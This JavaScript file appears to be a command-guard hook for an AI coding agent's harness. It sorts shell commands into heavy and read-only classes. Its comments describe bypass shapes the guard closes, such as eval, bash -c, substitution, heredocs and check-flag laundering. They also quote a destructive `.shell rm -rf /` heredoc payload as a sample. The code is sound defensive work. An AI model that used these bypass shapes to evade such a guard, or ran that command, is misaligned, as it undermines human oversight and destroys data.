  const subIdx = gitSubcommandIndex(tokens, gitIdx);
  const sub = subIdx === -1 ? '' : tokens[subIdx].toLowerCase();
  return T.classifyPullSubs.has(sub);
}

// isPipedIntoSegment(wholeCommand, segment) -> true iff `segment` (an exact,
// contiguous substring of wholeCommand — guaranteed by how splitSegments
// builds it: characters are copied straight from the source, never
// reordered) is immediately preceded, modulo whitespace, by a single `|`
// (not `||`) in the original command text. splitSegments CONSUMES the `|`
// operator itself when it flushes a segment (see its `if (c === '|')`
// branch), so the piped-into segment's own text never contains any trace of
// the pipe — this is the only way to recover that fact.
function isPipedIntoSegment(wholeCommand, segment) {
  if (typeof wholeCommand !== 'string' || typeof segment !== 'string') return false;
  const idx = wholeCommand.indexOf(segment);
  if (idx <= 0) return false;
  let i = idx - 1;
  while (i >= 0 && RX30.test(wholeCommand[i])) i--;
  return i >= 0 && wholeCommand[i] === '|' && wholeCommand[i - 1] !== '|';
}

// isSafeSqliteReadonly(segment, wholeCommand) -> true iff this is a
// `sqlite3` invocation with `-readonly` present as its OWN argv token before
// the db path, the SQL/args after the db path contain none of sqlite3's
// dangerous dot-commands (see T.sqliteDangerous below), AND the
// invocation has NO stdin input at all (P1 fix below).
//
// P1 fix (`sqlite3 -readonly db.sqlite <<'EOF'` + a `.shell rm -rf /`
// heredoc BODY): the heredoc body is intentionally treated as inert DATA by
// splitSegments — it is never re-parsed as SQL/args, by design (see the
// heredoc-handling comment above splitSegments), so T.sqliteDangerous
// below can NEVER see a dangerous dot-command hidden in a heredoc body, a
// herestring, an input-file redirect, or piped stdin. The only sound fix is
// to deny the WHOLE exemption whenever this invocation has any stdin input
// at all: a heredoc (`<<`), herestring (`<<<`), input-file redirect (`<`),
// or being the receiving end of a shell pipe (`... | sqlite3 ...`) — the SQL
// text sqlite3 will actually execute is then not fully visible to this
// static check, so it is never eligible for the read-only exemption, full
// stop. The `<`/`<<`/`<<<` check runs against the QUOTE-NEUTRALIZED segment
// (neutralizeQuotedContents) so a literal `<` inside quoted SQL DATA
// (`"select 1 < 2"`) does not itself trigger this — only a real, unquoted
// shell redirect/heredoc/herestring token does.
function isSafeSqliteReadonly(segment, wholeCommand) {
  if (effectiveVerb(segment) !== 'sqlite3') return false;
  if (RX31.test(neutralizeQuotedContents(segment))) return false;
  if (isPipedIntoSegment(wholeCommand, segment)) return false;
  const tokens = tokenizeQuoted(segment);
  const verbIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'sqlite3');
  if (verbIdx === -1) return false;
  let readonlyIdx = -1;
  let dbPathIdx = -1;
  for (let i = verbIdx + 1; i < tokens.length; i++) {
    if (tokens[i] === '-readonly') { readonlyIdx = i; continue; }
    if (tokens[i].startsWith('-')) continue; // some other flag
    dbPathIdx = i;
    break; // first non-flag token is the db path (sqlite3 [OPTS] FILE [SQL])
  }
  if (readonlyIdx === -1 || dbPathIdx === -1 || readonlyIdx > dbPathIdx) return false;
  const rest = tokens.slice(dbPathIdx + 1).join(' ');
  return !T.sqliteDangerous.test(rest);
}

function gcloudReadGrammar(rest, verbs, sepValues) {
  let i = 0;
  const path = [];
  while (i < rest.length && !rest[i].startsWith('-')) {
    const w = rest[i];
    if (verbs.has(w.toLowerCase())) break;
    path.push(w);
    i++;
  }
  if (i >= rest.length || rest[i].startsWith('-')) return null; // no verb in the path
  const verb = rest[i].toLowerCase();
  i++;
  if (!path.length) return null;
  for (let k = 0; k < path.length; k++) {
    const w = path[k];
    if (!RX32.test(w)) return null;
    if (k === 0 && w === 'run') continue;
    if (T.gcloudRefused.test(w)) return null;
  }
  let positional = null;
  if (i < rest.length && !rest[i].startsWith('-')) { positional = rest[i]; i++; }
  const flags = [];
  for (; i < rest.length; i++) {
    const t = rest[i];
    if (!t.startsWith('--')) return null; // a second positional, a short flag, or a separated value
    if (RX33.test(t)) {
      if (RX34.test(t)) return null;
      flags.push(t);
      continue;
    }
    if (T.gcloudBool.has(t)) { flags.push(t); continue; }
    if (sepValues === true && T.gcloudValue.has(t) && i + 1 < rest.length && !rest[i + 1].startsWith('-')) {
      flags.push(t + '=' + rest[i + 1]);
      i++;
      continue;
    }
    return null;
  }
  return { path, verb, positional, flags };
}

// stripGcloudStderrMerge(segment) -> the segment minus ONE trailing, unquoted,
// space-separated `2>&1` (stderr merged into the stdout pipe). That exact
// token is the ONLY redirection a gcloud read may carry: `>f`, `2>f`, `&>f`,
// `>&2`, `<f`, other fd dups, a quoted/escaped or mid-argv `2>&1` are left in
// place, so the unquoted-redirect check that follows still refuses them.
function stripGcloudStderrMerge(segment) {
  return segment.replace(RX35, '$1');
}

function isReadOnlyCloudInspect(segment) {
  const tokens = tokenizeQuoted(segment);
  const binIdx = tokens.findIndex((t) => T.cloudBinaries.has(basename(t).toLowerCase()));
  if (binIdx === -1) return false;
  const bin = basename(tokens[binIdx]).toLowerCase();
  const rest = tokens.slice(binIdx + 1);
  if (bin === 'gcloud') {
    // Same strict grammar as the narrow gcloud-read carve-out (0.113 P1):
    // a read verb found in ANY position (e.g. as a separated flag value,
    // `gcloud compute instances reset vm --zone list`) no longer qualifies.
    // Redirection: only a trailing `2>&1`; any other unquoted `>`/`<`
    // (including one glued to a flag value, `--format=json>f`) is refused.
    const stripped = stripGcloudStderrMerge(segment);
    if (hasUnquotedRedirectChar(stripped)) return false;
    const st = tokenizeQuoted(stripped);
    const sIdx = st.findIndex((t) => basename(t).toLowerCase() === 'gcloud');
    if (sIdx === -1) return false;
    const g = gcloudReadGrammar(st.slice(sIdx + 1), T.gcloudInspect);
    if (!g) return false;
    if (g.verb === 'read' && g.path[g.path.length - 1] !== 'logging') return false;
    return true;
  }
  // gh / kubectl: the verb is exactly the first token after the binary.
  const first = (rest[0] || '').toLowerCase();
  if (!T.cloudReadonly.has(first)) return false;
  for (let i = 1; i < rest.length; i++) {
    if (rest[i].startsWith('-')) continue;
    if (T.cloudMutating.has(rest[i].toLowerCase())) return false;
  }
  return true;
}

function isWholeCommandReadOnlyForm(command) {
  const cmd = command.trim();
  if (!RX36.test(cmd)) return false;
  if (RX37.test(cmd) || hasShellExpansionAnywhere(cmd)) return false;
  const split = splitSegmentsDetailed(cmd);
  const segs = split.segments;
  if (!segs.length || split.delims[split.delims.length - 1] !== 'end') return false;
  for (let i = 0; i < split.delims.length - 1; i++) if (split.delims[i] !== '|') return false;
  const first = segs[0].trim();
  let ok = false;
  const vq = first.replace(RX38, '');
  if (T.versionCli.test(vq)) {
    ok = !hasUnquotedRedirectChar(vq);
  } else {
    const stripped = stripGcloudStderrMerge(first);
    if (!hasUnquotedRedirectChar(stripped)) {
      const st = tokenizeQuoted(stripped);
      if (st[0] === 'gcloud') {
        const g = gcloudReadGrammar(st.slice(1), T.gcloudInspect, true);
        ok = !!g && !(g.verb === 'read' && g.path[g.path.length - 1] !== 'logging');
      }
    }
  }
  if (!ok) return false;
  for (let i = 1; i < segs.length; i++) {
    if (!isClosedSinkStage(segs[i].trim())) return false;
  }
  return true;
}

// readOnlyFormUnits(split) -> Set of segment indexes that belong to a chain UNIT which is, on its
// own, exactly one isWholeCommandReadOnlyForm. A chain is cut into units at `;` / `&&` only (a unit is
// its pipe-joined segments). The exemption applies ONLY when EVERY unit of the chain is read-only on
// its face: a whole read-only form, or one plain read-only git segment (a safe `git fetch`, or
// `git rev-parse|status|log|show` in the plain-chain shapes). Any other unit leaves the set empty, so the
// line is judged segment by segment exactly as before. (command-guard.js readOnlyFormUnits)
function readOnlyFormUnits(split) {
  const none = new Set();
  const out = new Set();
  const { segments, delims } = split;
  if (segments.length < 2 || !delims.some((x) => x === '&&' || x === ';')) return none;
  let start = 0;
  for (let i = 0; i < segments.length; i++) {
    const last = i === segments.length - 1;
    const cut = last || delims[i] === '&&' || delims[i] === ';';
    if (!cut) { if (delims[i] !== '|') return none; continue; }
    let text = '';
    for (let j = start; j <= i; j++) text += (j > start ? ' | ' : '') + segments[j].trim();
    if (isWholeCommandReadOnlyForm(text)) {
      for (let j = start; j <= i; j++) out.add(j);
    } else if (!(start === i && isPlainReadGitSegment(segments[i].trim()))) {
      return none;
    }
    start = i + 1;
  }
  return out;
}

// One plain read-only git segment: a fetch that isSafeGitFetch accepts, or a log/status/show/rev-parse in
// the exact shapes classifyPlainGitChainSegment recognises (no redirect, no expansion, no extra flags).
function isPlainReadGitSegment(segment) {
  if (isSafeGitFetch(segment)) return !hasUnquotedRedirectChar(segment) && !hasShellExpansionAnywhere(segment);
  const cls = classifyPlainGitChainSegment(segment);
  return !!cls && T.plainReadGitKinds.has(cls.kind);
}

// isClosedSinkStage(segment) -> true iff the stage is EXACTLY one of the closed
// stdin-only sink shapes (no file operand, no unknown flag; only used by
// isWholeCommandReadOnlyForm AND isBoundedSinkSegment, so every sink that
// decides an allow uses this one grammar):
//   head|tail            [no args | -N | -n N | -nN | -n +N | -c N | -cN]   (numeric only)
//   wc                   [-l|-c|-w|-m ...], no operands
//   grep [-E|-F|-G|-i|-v|-w|-x|-n|-H|-h|-o|-a]... (-c | -m N) PATTERN   (one pattern token, no file operand)
function isClosedSinkStage(segment) {
  if (hasUnquotedRedirectChar(segment) || hasShellExpansionAnywhere(segment)) return false;
  return closedSinkTokens(tokenizeQuoted(segment));
}
function closedSinkTokens(t) {
  if (!t.length) return false;
  const rest = t.slice(1);
  if (t[0] === 'head' || t[0] === 'tail') {
    if (rest.length === 0) return true;
    if (rest.length === 1) return RX39.test(rest[0]);
    if (rest.length === 2) return (rest[0] === '-n' || rest[0] === '-c') && RX40.test(rest[1]);
    return false;
  }
  if (t[0] === 'wc') return rest.every((a) => RX41.test(a));
  if (t[0] === 'grep') {
    // Bounded by -c or -m N; match-mode flags from a closed set; exactly one
    // non-flag operand (the pattern). No -f/-e/-r/-R/--include/--file: nothing
    // that names a file or a second pattern source.
    let bounded = false;
    let pattern = 0;
    for (let i = 0; i < rest.length; i++) {
      const a = rest[i];
      if (a === '-c') { bounded = true; continue; }
      if (a === '-m') {
        if (!RX42.test(rest[i + 1] || '')) return false;
        bounded = true; i++; continue;
      }
      if (RX43.test(a)) continue;
      if (a.startsWith('-')) return false;
      pattern++;
    }
    return bounded && pattern === 1;
  }
  return false;
}

function isReadOnlyGhGraphql(tokens, ghIdx) {
  if (!RX44.test(tokens[ghIdx + 2] || '')) return false;
  let queries = 0;
  for (let i = ghIdx + 3; i < tokens.length; i++) {
    const t = tokens[i];
    if (T.ghGqlBool.has(t)) continue;
    if (T.ghGqlValue.has(t)) {
      if (i + 1 >= tokens.length) return false;
      i++;
      continue;
    }
    if (T.ghField.has(t)) {
      if (i + 1 >= tokens.length) return false;
      const v = tokens[++i];
      const eq = v.indexOf('=');
      if (eq === -1) return false;
      if (v.slice(0, eq) !== 'query') continue;
      const q = v.slice(eq + 1);
      if (RX45.test(q) || q.startsWith('@') || RX46.test(q)) return false;
      const qt = q.trim();
      if (qt !== '' && !qt.startsWith('{') && !RX47.test(qt)) return false;
      queries++;
      continue;
    }
    return false;
  }
  return queries === 1;
}

// isHeavyGhSegment(segment) -> true iff this is a `gh` invocation of a
// mutating subcommand: pr merge/close/edit/create/review, issue
// create/close/delete/edit, release create/delete/edit/upload, repo
// delete/edit, secret set/delete, `gh workflow run`, or `gh api` used with
// -X/--method POST|PATCH|PUT|DELETE or any -f/-F/--field/--raw-field data
// argument (all of which mutate via the REST/GraphQL API regardless of
// method). Gated on effectiveVerb(segment) === 'gh' first, same discipline
// as isHeavyGitSegment, so `gh` appearing only as quoted DATA is never
// misread as a real invocation.
function isHeavyGhSegment(segment, command) {
  if (effectiveVerb(segment) !== 'gh') return false;
  const tokens = tokenizeQuoted(segment);
  const ghIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'gh');
  if (ghIdx === -1) return false;
  const group = (tokens[ghIdx + 1] || '').toLowerCase();
  const sub = (tokens[ghIdx + 2] || '').toLowerCase();
  if (group === 'workflow' && sub === 'run') return true;
  if (T.ghMutating[group] && T.ghMutating[group].has(sub)) return true;
  if (group === 'api') {
    // The splitter cuts a segment AT a backtick, so a trailing `query=`\`cmd\``
    // looks empty here; any backtick in the whole command voids the read proof.
    if (isReadOnlyGhGraphql(tokens, ghIdx) && !(command || '').includes('`')) return false;
    // `gh api graphql` always POSTs: heavy unless proven a read above.
    if (tokens.slice(ghIdx + 2).some((t) => RX44.test(t))) return true;
    for (let i = ghIdx + 2; i < tokens.length; i++) {
      const t = tokens[i];
      if (t === '-f' || t === '-F' || t === '--field' || t === '--raw-field') return true;
      // Attached forms (-fk=v, -Fk=v, --field=k=v, --raw-field=k=v) and a
      // request body (--input f / --input=f) are data args, same as separated.
      if (RX48.test(t) || RX49.test(t) || t === '--input') return true;
      if (t === '-X' || t === '--method') {
        if (T.ghApiMethods.has((tokens[i + 1] || '').toUpperCase())) return true;
      }
    }
  }
  return false;
}

// Per-segment checks that need tokenized/positional logic (not a plain regex
// substring match) — evaluated alongside lightList() in isHeavySegment.
const LIGHT_EXCEPTION_FNS = [isSafeGitFetch, isSafeSqliteReadonly, isReadOnlyCloudInspect];

// isFlaggedInterpreterScript(segment) -> true when the segment is
// `python*|node <flag...> <script>.py|.js|.mjs|.cjs ...` — an interpreter
// invocation of a real script file with one or more interpreter FLAGS
// (dash-prefixed tokens, value-taking or not, e.g. `-i`, `-X importtime`,
// `--inspect`, `--env-file=.env`) sitting between the interpreter and the
// script. T.heavyPatterns above only matches the flagless shape
// (`python3 x.py`) because it requires the script token to sit immediately
// after the interpreter; without this check a flag placed BEFORE the script
// (`python3 -i x.py`, `node --inspect x.js`) never classifies heavy at all,
// so the command exits ALLOW before the --check carve-out's
// isInterpreterScriptCheck ever runs to refuse it (that refusal is correct
// but unreachable). This function only WIDENS the heavy net to make sure the
// carve-out is reached; it does not by itself decide the carve-out's ALLOW.
function isFlaggedInterpreterScript(segment) {
  const tokens = segment.trim().split(RX28).filter(Boolean);
  if (tokens.length < 3) return false;
  if (!T.scriptInterp.test(tokens[0])) return false;
  if (!tokens[1].startsWith('-')) return false; // flagless shape: T.heavyPatterns already covers it
  const ext = RX50.test(tokens[0]) ? RX51 : RX52;
  for (let i = 1; i < tokens.length; i++) {
    if (ext.test(tokens[i])) return true;
  }
  return false;
}

function isHeavySegment(segment, command) {
  segment = segment.replace(T.controlPrefix, '');
  const unwrapped = segment.replace(T.timeoutPrefix, '');
  for (const re of lightList()) {
    if (re.test(segment) || re.test(unwrapped)) return false;
  }
  for (const fn of LIGHT_EXCEPTION_FNS) {
    if (fn(segment, command)) return false;
  }
  if (isSafeNodeEval(segment)) return false;
  if (isNodeDashEInvocation(segment)) return true;
  if (isHeavyGitSegment(segment)) return true;
  if (isHeavyGhSegment(segment, command)) return true;
  if (isFlaggedInterpreterScript(segment)) return true;
  const verb = effectiveVerb(segment);
  if (verb && T.heavyVerbs.has(verb)) return true;
  // For PATTERN matching only, neutralize quoted string contents so a benign
  // command whose only heavy-looking text is inside a quoted DATA arg
  // (`echo "npm run build"`, `printf 'go test ./...'`) is NOT flagged. Real
  // unquoted heavy commands survive neutralization and still match.
  let forPatterns = neutralizeQuotedContents(segment);
  // Also blank the search-PATTERN operand of grep/sed/awk (T.patternFirstVerbs)
  // — a heavy word appearing inside a search pattern, quoted OR unquoted
  // (`grep deploy file`, `grep -n 'npm run build' f`), is DATA describing what
  // to search for, not a command to run. See blankPatternArgument().
  forPatterns = blankPatternArgument(forPatterns, verb);
  for (const re of T.heavyPatterns) {
    if (re.test(forPatterns)) return true;
  }
  return false;
}

// extractSubstitutions() and SHELL_VERBS are imported from
// ./lib/shell-scan.js (shared with git-guard.js). extractSubstitutions finds
// nested command strings hidden inside a segment so they are evaluated too
// (the segment splitter treats $(...) / backticks as plain boundaries and
// never inspects their CONTENTS):
//   (a) command substitution: $( ... ) and ` ... ` -> the inner command text.
// It is heredoc-aware (mirrors splitSegments' handling): a QUOTED delimiter
// (<<'EOF', <<"EOF") means the body is INERT DATA in a real shell — no
// $(...)/backtick expansion inside it — so its body is skipped from this
// substitution scan entirely, never treated as executable content. Root
// cause (field report): without this, a backtick-quoted span appearing as
// ordinary prose inside a `<<'EOF'` message body (e.g. `` `pytest tests -k
// <codebase>` `` inside a devswarm.js send message) was extracted as a real
// command substitution and recursed into isHeavyCommand, misclassifying
// quoted DATA as an executed command (verb: pytest). An UNQUOTED delimiter
// (<<EOF) DOES expand $(...)/backticks in a real shell, so its body is
// intentionally NOT skipped — the scan falls through and continues over it
// normally, still catching substitutions inside.
//   (b) shell -c payloads (extractShellCPayload below): when the effective
//       verb is a SHELL_VERBS member and a -c flag is present, the QUOTED
//       argument after -c is itself command(s).
// Depth bounding is handled by the recursive caller below (isHeavyCommand).

// If a segment is `bash -c '<payload>'` (or sh/zsh/dash -c "..."), return the
// unquoted payload command string, else ''. Best-effort tokenization.
function extractShellCPayload(segment) {
  return cmdMemo('shc:' + segment, function () { return extractShellCPayloadRaw(segment); });
}
function extractShellCPayloadRaw(segment) {
  const verb = effectiveVerb(segment);
  if (!verb || !T.shellVerbs.has(verb)) return '';
  // Tokenize respecting quotes so the payload (which contains spaces) stays whole.
  const tokens = [];
  let cur = ''; let q = ''; let any = false;
  const str = segment.trim();
  for (let i = 0; i < str.length; i++) {
    const c = str[i];
    if (q) { if (c === q) { q = ''; } else cur += c; any = true; continue; }
    if (c === "'" || c === '"') { q = c; any = true; continue; }
    if (cmdWs(c)) { if (any) { tokens.push(cur); cur = ''; any = false; } continue; }
    cur += c; any = true;
  }
  if (any) tokens.push(cur);
  // Find the -c flag; the NEXT token is the command payload.
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    if (t === '-c' || t === '--command') {
      return i + 1 < tokens.length ? tokens[i + 1] : '';
    }
    // Bundled short flags like -lc / -xc also carry a payload in the next token.
    if (RX53.test(t)) {
      return i + 1 < tokens.length ? tokens[i + 1] : '';
    }
  }
  return '';
}

// If a segment is `eval <payload>`, return the payload as a COMMAND string to be
// re-parsed (NOT treated as a quoted data literal). `eval` runs its argument(s)
// as a shell command, so heavy commands can hide behind it (`eval "npm test"`,
// `eval npm test`). We collect every token AFTER the `eval` verb, honoring quotes
// so a quoted multi-word payload (`eval "npm run build"`) stays a single command
// string, and join them with spaces. The quote delimiters are stripped so the
// payload is the COMMAND text itself — this is what makes `eval "npm test"` parse
// as `npm test` (heavy) rather than a benign quoted data arg. Returns '' if the
// effective verb is not `eval` or there is no payload. Best-effort tokenization,
// mirroring extractShellCPayload.
function extractEvalPayload(segment) {
  return cmdMemo('evl:' + segment, function () { return extractEvalPayloadRaw(segment); });
}
function extractEvalPayloadRaw(segment) {
  const verb = effectiveVerb(segment);
  if (verb !== 'eval') return '';
  // Tokenize respecting quotes; strip quote delimiters so the payload is raw cmd.
  const tokens = [];
  let cur = ''; let q = ''; let any = false;
  const str = segment.trim();
  for (let i = 0; i < str.length; i++) {
    const c = str[i];
    if (q) { if (c === q) { q = ''; } else cur += c; any = true; continue; }
    if (c === "'" || c === '"') { q = c; any = true; continue; }
    if (cmdWs(c)) { if (any) { tokens.push(cur); cur = ''; any = false; } continue; }
    cur += c; any = true;
  }
  if (any) tokens.push(cur);
  // Drop everything up to and including the `eval` verb token (basename-aware:
  // a path like /usr/bin/eval still resolves to eval). Leading wrapper/assignment
  // prefixes are already accounted for because effectiveVerb confirmed `eval`.
  let idx = 0;
  while (idx < tokens.length && basename(tokens[idx]).toLowerCase() !== 'eval') idx++;
  idx++; // skip the eval token itself
  const payloadTokens = tokens.slice(idx).filter(t => t.length);
  return payloadTokens.join(' ');
}

// A command is heavy if ANY of its segments is heavy. This fixes the core bug:
// the old code only inspected the first verb of the whole unsegmented string and
// short-circuited lightList() on the whole string, so `cd app && npm test`,
// `git status && npm run build`, and `FOO=1 docker build .` all bypassed.
//
// RECURSION: also evaluates commands hidden in command substitution `$(...)` /
// backticks and in `bash -c '...'` payloads, so `echo "$(npm run build)"` and
// `bash -c "npm run build"` are caught. Depth-bounded to avoid pathological input.
function isHeavyCommand(command, depth) {
  if (typeof command !== 'string' || !command.trim()) return false;
  const d = typeof depth === 'number' ? depth : 0;
  if (d === 0 && isWholeCommandReadOnlyForm(command)) return false;
  const split = splitSegmentsDetailed(command);
  const exempt = d === 0 ? readOnlyFormUnits(split) : null;
  for (let si = 0; si < split.segments.length; si++) {
    if (exempt && exempt.has(si)) continue;
    const seg = split.segments[si];
    if (isHeavySegment(seg, command)) return true;
    if (d < T.maxDepth) {
      // (b) shell -c payload: unwrap and evaluate as command(s).
      const payload = extractShellCPayload(seg);
      if (payload && isHeavyCommand(payload, d + 1)) return true;
      // (c) eval payload: unwrap eval's argument(s) and evaluate as command(s).
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload && isHeavyCommand(evalPayload, d + 1)) return true;
    }
  }
  // (a) command substitution: scan the WHOLE command (substitutions can span
  // segment boundaries / quotes) and recurse into each captured inner command.
  if (d < T.maxDepth) {
    for (const inner of extractSubstitutions(command)) {
      if (isHeavyCommand(inner, d + 1)) return true;
    }
  }
  return false;
}

// Produce a SAFE classification label for the block reason — describes WHY the
// command was flagged WITHOUT reflecting any arbitrary user/command text back into
// the model-visible reason (injection hygiene). Returns either a detected heavy
// verb drawn from the fixed T.heavyVerbs allowlist, or a fixed category name.
// Every returned value is from a closed, code-defined set — never raw input.
function classifyHeavy(command, depth) {
  if (typeof command !== 'string' || !command.trim()) return null;
  const d = typeof depth === 'number' ? depth : 0;
  for (const seg of splitSegments(command)) {
    if (isHeavySegment(seg, command)) {
      if (isHeavyGhSegment(seg) || isGitPushSegment(seg) || isGitPullFetchSegment(seg)) return { kind: 'remote', label: ah.cfg('command.msg_heavy_remote') };
      const verb = effectiveVerb(seg);
      if (verb && T.heavyVerbs.has(verb)) return { kind: 'verb', label: verb };
      return { kind: 'category', label: ah.cfg('command.heavy_pattern_label') };
    }
    if (d < T.maxDepth) {
      const payload = extractShellCPayload(seg);
      if (payload) {
        const inner = classifyHeavy(payload, d + 1);
        if (inner) return inner;
      }
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload) {
        const inner = classifyHeavy(evalPayload, d + 1);
        if (inner) return inner;
      }
    }
  }
  if (d < T.maxDepth) {
    for (const inner of extractSubstitutions(command)) {
      const c = classifyHeavy(inner, d + 1);
      if (c) return c;
    }
  }
  return null;
}

// ---------------------------------------------------------------------------
// "Narrow allow" read-only verification carve-out (owner-approved 2026-09-26,
// "Narrow allow"). Lets the COORDINATOR run a short, BOUNDED, single-target
// verification command inline (e.g. re-running one test file to verify a
// subagent's "done" claim — rule L) instead of delegating it, even though
// isHeavyCommand() would otherwise flag it. This is checked ONLY as a final
// override AFTER a command is already classified heavy (main() calls it
// right before building the block reason) — it never widens what counts as
// heavy, and it never touches subagent context (subagents already pass
// through everything). Gated by guards.allowReadOnlyVerify (default true).
//
// Reuses splitSegmentsDetailed/effectiveVerb/neutralizeQuotedContents/
// blankPatternArgument/T.heavyVerbs/T.heavyPatterns — no new parser (a
// recurring bug class here is a second/third hand-rolled segment splitter).
//
// ALL of these must hold, or the command stays blocked:
//   1. every segment is either the qualifying single-target check, a
//      PIPE-fed bounded-output sink (tail/head/grep -c/grep -m N/wc), or
//      trivially safe (cd/pwd/true) — a segment that is none of these
//      (including a second, different heavy command) disqualifies the WHOLE
//      line. This is what keeps `pytest -q x.py; npm test`,
//      `node --test $(ls tests)`, `ksh -c "..."`, and a `--check` hidden
//      inside an otherwise-heavy invocation (`npm run build --check`, still
//      classified heavy because npm IS a HEAVY_VERB) blocked.
//   2. the bounded sink must be reached via an actual `|` (checked against
//      splitSegmentsDetailed's own delimiter for the PRECEDING segment) —
//      `<check> ; tail` (sequential, not piped) does not count as bounded
//      output and disqualifies the line.
//   3. no write redirect (`>`, `>>`, `tee`) to a path outside the session
//      scratchpad or a tmp root, on ANY segment.
// ---------------------------------------------------------------------------

const VERIFY_CHECK_FLAG_RE = /(^|\s)--(?:check|dry-run|list)(?:=\S+)?(?=\s|$)/;
const CHECK_FLAG_INLINE_CODE_FLAG_RE = /(^|\s)(?:-[A-Za-z]*[ce]|--eval|--command)(?=[\s=]|$)/;
const VERIFY_CHECK_FLAG_RE_G = new RegExp(VERIFY_CHECK_FLAG_RE.source, 'g');

function leadsWithRefusedCheckVerb(segment) {
  const tokens = segment.trim().split(RX28).filter(Boolean);
  let idx = 0;
  while (idx < tokens.length && RX29.test(tokens[idx])) idx++;
  for (; idx < tokens.length; idx++) {
    const word = basename(tokens[idx]).toLowerCase().replace(/^['"]+|['"]+$/g, '');
    if (T.checkFlagRefused.has(word) || RX54.test(word)) return true;
    if (!T.wrappers.has(word) && !RX55.test(word) && !RX56.test(word)) break;
  }
  const verb = effectiveVerb(segment);
  return !!verb && (T.checkFlagRefused.has(verb) || RX54.test(verb));
}

function isGenericCheckFlagCommand(segment) {
  const verb = effectiveVerb(segment);
  if (verb && T.heavyVerbs.has(verb)) return false;
  if (leadsWithRefusedCheckVerb(segment)) return false;
  if (CHECK_FLAG_INLINE_CODE_FLAG_RE.test(neutralizeQuotedContents(segment))) return false;
  // With the check flag(s) removed, the segment must not be heavy under the
  // FULL classifier (wrapper/-c/eval/substitution unwrapping included) — the
  // flag may only ever narrow a non-heavy command, never launder a heavy one.
  if (isHeavyCommand(segment.replace(VERIFY_CHECK_FLAG_RE_G, ' '))) return false;
  let forPatterns = neutralizeQuotedContents(segment);
  forPatterns = blankPatternArgument(forPatterns, verb);
  for (const re of T.heavyPatterns) {
    if (re.test(forPatterns)) return false;
  }
  const neutralized = neutralizeQuotedContents(segment);
  return VERIFY_CHECK_FLAG_RE.test(' ' + neutralized + ' ');
}

const SCRIPT_CHECK_REFUSED_FLAG_RE =
  /(^|\s)(?:-[A-Za-z]*[cemprI]|--eval|--command|--print|--require|--import|--loader|--experimental-loader|--interactive)(?=[\s=]|$)/;

// isInsideAntiHallPlugin(realPath) -> true when realPath lies under THIS
// plugin's root (hooks/..) or under any ancestor directory whose
// .claude-plugin/plugin.json names "anti-hall" (a second install, a cache
// copy, a dev checkout). Every anti-hall copy ships that manifest, the Codex
// install included (it runs these same hooks from the same plugin dir).
// Fail-closed: an error reading a manifest that exists counts as anti-hall.
function isInsideAntiHallPlugin(realPath) {
  let ownRoot;
  try { ownRoot = fs.realpathSync(path.resolve(__dirname, '..')); } catch (_) { ownRoot = path.resolve(__dirname, '..'); }
  const relOwn = path.relative(ownRoot, realPath);
  if (relOwn && !relOwn.startsWith('..') && !path.isAbsolute(relOwn)) return true;
  let dir = path.dirname(realPath);
  for (let i = 0; i < T.pluginWalkLevels; i++) {
    const manifest = path.join(dir, T.pluginManifestRel);
    if (fs.existsSync(manifest)) {
      try {
        if (String(JSON.parse(fs.readFileSync(manifest, 'utf8')).name) === T.pluginName) return true;
      } catch (_) { return true; }
    }
    const parent = path.dirname(dir);
    if (parent === dir) break;
    dir = parent;
  }
  return false;
}

function isInterpreterScriptCheck(segment, ctx) {
  if (settingsGet('guards', 'allowReadOnlyVerifyScripts') === false) return false;
  const trimmed = segment.trim();
  const tokens = trimmed.split(RX28).filter(Boolean);
  if (tokens.length < 3) return false;
  if (ctx && ctx.cwdUnknown) return false; // a preceding `cd` we could not resolve: relative script path is unknowable
  const payload0 = ctx && ctx.payload;
  const base0 = (payload0 && typeof payload0.cwd === 'string' && payload0.cwd) || process.cwd();
  if (!T.scriptInterp.test(basename(tokens[0]).toLowerCase())) return false;
  // A path-qualified interpreter (`../venv/bin/python`, `.venv/bin/python3`) is
  // the same shape as the bare name: plain path chars only, and it must be an
  // existing regular file (a nonexistent path is not a checkable interpreter).
  if (tokens[0] !== basename(tokens[0])) {
    if (RX57.test(tokens[0])) return false;
    try { if (!fs.statSync(path.resolve(base0, tokens[0])).isFile()) return false; } catch (_) { return false; }
  }
  const script = tokens[1];
  if (script === '-' || script.startsWith('-')) return false;
  if (RX57.test(script)) return false;
  // Anywhere in the segment: no expansion, no stdin/heredoc, no inline code.
  if (RX58.test(segment)) return false;
  const neutralized = neutralizeQuotedContents(segment);
  if (RX31.test(neutralized)) return false;
  if (SCRIPT_CHECK_REFUSED_FLAG_RE.test(neutralized)) return false;
  if (!VERIFY_CHECK_FLAG_RE.test(' ' + neutralized + ' ')) return false;
  const base = base0;
  let realScript;
  try {
    // Joined WITHOUT lexical normalization, then realpath'd: the kernel resolves
    // `L/../x` through the symlink L, so path.resolve's textual `..` collapse
    // would point at a different file than the one that actually runs.
    const joined = path.isAbsolute(script) ? script : base.replace(RX8, '') + '/' + script;
    realScript = fs.realpathSync.native(joined); // .native: libc realpath keeps `L/..` physical (JS realpathSync pre-normalizes `..`)
    if (!fs.statSync(realScript).isFile()) return false;
  } catch (_) { return false; }
  // Never a way to flip a safety switch or trust an allowlist from the main
  // thread: `--confirmed` anywhere refuses, and so does any anti-hall script
  // (this plugin's own root, or any other anti-hall install/checkout found by
  // walking up from the script's realpath).
  if (tokens.some((t) => t === '--confirmed' || t.startsWith('--confirmed='))) return false;
  if (isInsideAntiHallPlugin(realScript)) return false;
  const rest = trimmed.slice(trimmed.indexOf(script, tokens[0].length) + script.length);
  if (isHeavyCommand(('true ' + rest).replace(VERIFY_CHECK_FLAG_RE_G, ' '))) return false;
  return true;
}

function isSyntaxOnlyCompileCheck(segment) {
  const verb = effectiveVerb(segment);
  if (!verb || !T.verifySyntaxCompilers.has(verb)) return false;
  return RX59.test(segment);
}

// `python3 -m pytest -q <single file or file::test>` — the exact documented
// shape only: no globs, no directory target, no extra args past the one
// target token.
function isSinglePytestFileCheck(segment) {
  const m = segment.trim().match(RX60);
  if (!m) return false;
  const target = m[1];
  if (RX61.test(target)) return false;
  if (target.endsWith('/')) return false;
  return true;
}

// `node --test <one or two explicit test files>` — no globs, no dirs, no
// extra flags; each target must look like an explicit JS/TS test file.
